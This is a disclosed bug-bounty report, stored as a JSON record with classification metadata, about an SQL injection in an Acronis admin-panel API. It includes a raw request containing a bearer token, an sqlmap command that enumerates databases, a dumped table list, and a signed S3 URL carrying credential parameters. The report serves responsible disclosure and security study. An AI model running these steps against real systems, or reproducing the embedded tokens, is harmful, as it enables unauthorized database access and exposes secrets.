{
  "reported_to": "Acronis",
  "reported_by": "stealthy ",
  "title": "SQL injection on admin.acronis.host development web service",
  "content": "\nSummary:\nI found an Acronis domain and started hunting on it. During my hunting, I found an admin panel and was able to access this panel (separate report inbound). It was easy to gain access to this panel, and I was not sure if it was for testing purposes or a genuine admin panel. I played around with minor settings to see if I could change some content on the main page and ensure that this was a real admin panel. I put a quote in the search bar for indexing dashboard pages and intercepted the request. Then I realized all requests are through the administrator API, which I now have access to and an authorization bearer token. Admin API access, combined with the entire site index in the panel (including all content for all pages), confirmed that I am in a real live admin panel.\nNext, I noticed the quote returned a server error in the API. I tested an SQL injection (along with one other critical bug) and confirmed its presence. I can view three databases, and I dumped the table names for one of the databases to see what type of information it contained. In the database, there are tables named users, password_resets, and more. Furthermore, the login redirected to the main Acronis website, so I knew this data is quite sensitive. I only explored nonsensitive data. The extent of what I did with the SQL injection is diclosed in this report below.\nI understand this domain is not rated critical, but I set it because of the severity of the bug.\nSteps to Reproduce:\nVisit the admin panel for Acronis hosting.\nhttps://admin.acronis.host/\nLogin with the given credentials and visit the pages section.\nhttps://admin.acronis.host/#/pages\nHere input any data and intercept the request. Below is a copy of the raw request.\nCode 784 Bytes\n1GET /api/admin/pages?page=1&limit=100&sort=%2Btype&filter=%7B%7D&search=* HTTP/1.1\n2Host: dev.acronis.host\n3User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0\n4Accept: application/json, text/plain, */*\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZXYuYWNyb25pcy5ob3N0XC9hcGlcL2F1dGhcL2xvZ2luIiwiaWF0IjoxNTk0Njk1MzgzLCJleHAiOjE1OTQ3MzEzODMsIm5iZiI6MTU5NDY5NTM4MywianRpIjoiSnBkczlKY0x6VHF5QXphOCIsInN1YiI6MSwicHJ2IjoiODdlMGFmMWVmOWZkMTU4MTJmZGVjOTcxNTNhMTRlMGIwNDc1NDZhYSJ9._K-nn1elXhqx1RNszBeZFwX1dbyCVtv63m_-DGp7UmE\n8Origin: https://admin.acronis.host\n9Connection: close\n10Referer: https://admin.acronis.host/dev.acronis.host/en-US/products/4372\n11\nThe search parameter is vulnerable. Save the request I provided as a text file on your desktop and run the following command with SQLMap.\nCode 79 Bytes\n1sudo python sqlmap.py -r {PATH TO FILE} --level 5 --risk 3 --random-agent --dbs\nThis will drop the following three databases.\n<image_0>\nNext, I used the following flags in SQLMap -D acronis_site --tables. The -D tells SQLMap which database and --tables tells SQLMap to drop table names. I only explored nonsensitive information.\nCode 684 Bytes\n1Database: acronis_site\n2[24 tables]\n3+----------------------+\n4| awards               |\n5| failed_jobs          |\n6| files                |\n7| history_pages        |\n8| locales              |\n9| migrations           |\n10| page_products        |\n11| page_translations    |\n12| pages                |\n13| pages_1              |\n14| pages_2              |\n15| pages_3              |\n16| password_resets      |\n17| product_prices       |\n18| product_translations |\n19| products             |\n20| products_1           |\n21| related_products     |\n22| related_tags         |\n23| resources            |\n24| tags                 |\n25| users                |\n26| variables            |\n27| webinars             |\n28+----------------------+\nAfter seeing this, I ceased testing this SQL injection and reported the vulnerability directly to your team.\nImpact\nServer-side SQL injection leading to database access and exposure of sensitive information. Reading this information likely allows an attacker to execute remote code by stealing admin password resets and user information.\n\n",
  "severity": [
    8.9,
    null
  ],
  "bounty": 250,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tiPCiXJXbLGzgSZWXNQRTxac?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-07-13_at_8.30.56_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-07-13_at_8.30.56_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ6Q4I2XVZ%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T193447Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIAHCNgafvmtr9wSqgAJqRrEEq%2FlBzne7TGNZbUijbqBaAiAPBky8aFbVOXx1OmTwqjRlzc2gSHiWXYUy2GXFdGtP%2BSqyBQgbEAMaDDAxMzYxOTI3NDg0OSIMQq6FLzqWzt%2F%2FJ7ZNKo8FBJakUcz58cefSN3maEIJQQZsi8SEb8usJgvN1oidSHHX0iEvKA0DU9sRpADt7CWpdHA%2F5EwQcg5p6MrETN4caL4xLKeKlX6RPITSAZcfha47FzQq3CKshI0LUXI4vYyINJfCAwEc9ivtouXvZUAemRDhk7TQCFSN6aHNmrbE4xfIp0%2FRX6syAJNgr4t9QxrHin2dUiUZHemsX4Eqpe8yVNmv4rI0oDgwlNyAKQDw2Ij5mzAshSlrvupwfNjWxHhVh6Hj4tirRaqBXoQuDI4QgRjHuaP2w6e0WpSTEoesXQe1tnqDGjAvYI1S1AeHq9p%2Fn5DtCEV%2Bi0cUT%2BzFhwboAgiZiBQ6hIBAiVOYVbROZmSdo5qBhTbipmkz%2B0ICvg%2BkkKa0QsfbOQKrcdh9gENX5DAKmDNIYe3HoSg3yP9v5ulcGRwGi6y7rvZGFPR%2BXdrBa0I8GyLr4Vet8FExWXckYNo2hHfqDM1DM9LchJVTPLAGD3fZowfNJZwo8SlFk3D7fYmww5vgVOnmZsG%2Fc8Wi2OQ4e%2BHbB79kLLFnNQzhbWWoXVhejgZpktqcOeVTJhcLvTiBnxae3wY4cLDDaWLREOFsWaP2%2FIrPO9rEkYtkExFwgoCo5stF3Ep1Y6nzBLrrF698LfgWE8V5YxjLv77S6ctXf7cCEzFrAAss0y0n75sPyGzmZh8Y4Sz3EdYOnskkeUtCNavsto2yJXm6PMYSjWZDQ7tponEnaJbDY%2FP7JXujM%2BWt4sqFwYL6E8m%2BusyHS%2FbotfYhrk%2BjTYeNe%2FMDs1ZHco9%2BsOX0OmvvSBa1CNwAWB7MAmPQguPMcWIc3C9wvjNjG5LPuAExi8lucZn6z6b7v4Xagy%2BIbQVUhIFigzCd24u%2FBjqyAaPbh1ea1fVL2NHI%2BbD4P7UneZDC%2Bk%2BZgeeP4kkqwodPsVIo3pDAayFfcKb1fn7C%2FJet%2BowzJY8Wq87GGoACGzTO11tI5xMcMWHb5qxzvppOpktHh9zNIIW4tYHa7uAuviviLgyY64%2FlnVxnPTF6EIamnEBE9A74zDdmDYenAgY%2F47VWrTSQd2NZulrJGmEEoX0n77sxGHqxam1i9qGYXNWWrcCFlvoCMFFEg%2FsZluoX8Lw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=18f927fb3f76048b098d441300d211caa6d6d10bf4a70b0d1182d8bd5d77a376"
  },
  "disclosed_date": 1624399920,
  "report_url": "https://hackerone.com/reports/923020",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Visit the admin panel for Acronis hosting at https://admin.acronis.host/ and log in with the given credentials."
    ],
    [
      2,
      "Navigate to the pages section and input any data into the search bar, then intercept the request to identify the vulnerable search parameter."
    ],
    [
      3,
      "Use SQLMap with the intercepted request to exploit the SQL injection vulnerability and access the databases."
    ],
    [
      4,
      "Explore the database tables to confirm the presence of sensitive information such as users and password_resets."
    ]
  ],
  "vuln_description": "The vulnerability is a server-side SQL injection in the search parameter of the admin panel API, allowing unauthorized access to sensitive database information including user credentials and password resets.",
  "reason": "The attack involves straightforward steps of identifying a vulnerable parameter and using common tools like SQLMap to exploit it. The interaction between components is not subtle or complex, and the vulnerability does not require manipulation of complex application states or novel logic.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability was discovered by manipulating the search parameter in an authenticated API request, which falls under the methodology of testing actions with existing user sessions (AuthZ) and substituting resource parameters (IDOR). The detection method involves analyzing HTTP requests and responses to identify unauthorized access or injection points.",
    "is_detectable": true
  }
}